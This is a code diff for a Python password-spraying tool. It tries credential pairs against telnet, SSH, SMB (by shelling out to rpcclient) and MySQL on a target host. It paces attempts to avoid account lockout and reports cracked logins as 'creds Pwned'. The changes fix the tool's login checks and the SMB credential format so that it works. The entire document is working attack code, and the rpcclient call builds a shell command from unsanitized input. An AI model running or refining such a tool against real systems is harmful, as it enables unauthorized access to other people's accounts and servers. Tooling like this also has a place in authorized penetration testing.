@@ -63,22 +63,23 @@ def telnet_connect(user,password):
 	u = (user+'\n').encode('utf-8')
 	p = (password+'\n').encode('utf-8')
 	telnet_p = spec_port if spec_port else 23
-	try:
-		tn = telnetlib.Telnet(ip,telnet_p)
-		tn.read_until('login: '.encode('utf-8'))
-		tn.write(u)
-		tn.read_until('Password: '.encode('utf-8'))
-		tn.write(p)
+	tn = telnetlib.Telnet(ip,telnet_p)
+	tn.read_until('login: '.encode('utf-8'))
+	tn.write(u)
+	tn.read_until('Password: '.encode('utf-8'))
+	tn.write(p)
+	tn.read_some()#\r\n
+	return_message = tn.read_some().decode('utf-8')
+	tn.close()
+	if 'Login incorrect' not in return_message and return_message:
 		valid_creds.append(user+':'+password)
 		msg += pGreen(' -> Success!!!')
 		print(msg)
 		return True
-	except Exception as e:
-		print(str(e))
+	else:
 		msg += pRed(' -> Failed!!!')
-		pass
-	print(msg)
-	return False
+		print(msg)
+		return False
 
 def ssh_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
@@ -92,12 +93,15 @@ def ssh_connect(user,password):
 		msg += pGreen(' -> Success!!!')
 		print(msg)
 		return True
-	except paramiko.AuthenticationException:
-		msg += pRed(' -> Failed!!!')
-		pass
 	except paramiko.ssh_exception.SSHException as e:
 		if 'Error reading SSH protocol banner' in str(e):
 			print(pWarning('Carefull to many requests performed on the server try adding more time!!'))
+		msg += pRed(' -> Failed!!!')
+		pass
+	except paramiko.AuthenticationException:
+		msg += pRed(' -> Failed!!!')
+		pass
+	except Exception:
 		msg += pRed(' -> Failed!!!')
 		pass
 	print(msg)
@@ -105,7 +109,7 @@ def ssh_connect(user,password):
 
 def smb_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
-	result = os.popen( 'rpcclient -U "{}.{}" -c "getusername;quit" {}'.format(user,password,ip)).read()
+	result = os.popen( 'rpcclient -U "{}%{}" -c "getusername;quit" {}'.format(user,password,ip)).read()
 	if not 'NT_STATUS_LOGON_FAILURE' in result:
 		valid_creds.append(user+':'+password)
 		msg += pGreen(' -> Success!!!')
@@ -122,17 +126,13 @@ def mysql_connect(user,password):
 	try:
 		mydb = mysql.connector.connect(host=ip,user=user,password=password,port=mysql_p)
 		cursor = mydb.cursor()
-		cursor.execute("SELECT @@VERSION")
+		cursor.execute("SHOW DATABASES;")
 		mydb.close()
 		valid_creds.append(user+':'+password)
 		msg += pGreen(' -> Success!!!')
 		print(msg)
 		return True
-	except mysql.connector.Error as err:
-		if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
-  			msg += pRed(' -> Failed!!!')
-	except Exception as e:
-		print(str(e))
+	except mysql.connector.errors.DatabaseError:
 		msg += pRed(' -> Failed!!!')
 		pass
 	print(msg)
@@ -140,6 +140,8 @@ def mysql_connect(user,password):
 
 def spray():
 	c_attemps = 0
+	user_remove = ''
+	success = False
 	for p in pass_list:
 		if c_attemps == max_attemps:
 			print(pWarning('Going to sleep for {} minutes'.format(timer)))
@@ -158,12 +160,17 @@ def spray():
 			else:
 				success = smb_connect(u,p)
 			if success:
-				user_list.remove(u)
+				user_remove = u
+		if user_remove:	
+			user_list.remove(user_remove)
+			user_remove = ''
 		c_attemps+= 1
 
 	if len(valid_creds)>0:
-		print(pGreen('Obtained the following credentials:'))
+		print(pGreen('creds Pwned:'))
 		print(''.join(creds+'\n' for creds in valid_creds))
+	else:
+		print('No valid creds found')
 	return
 
 if __name__ == '__main__':
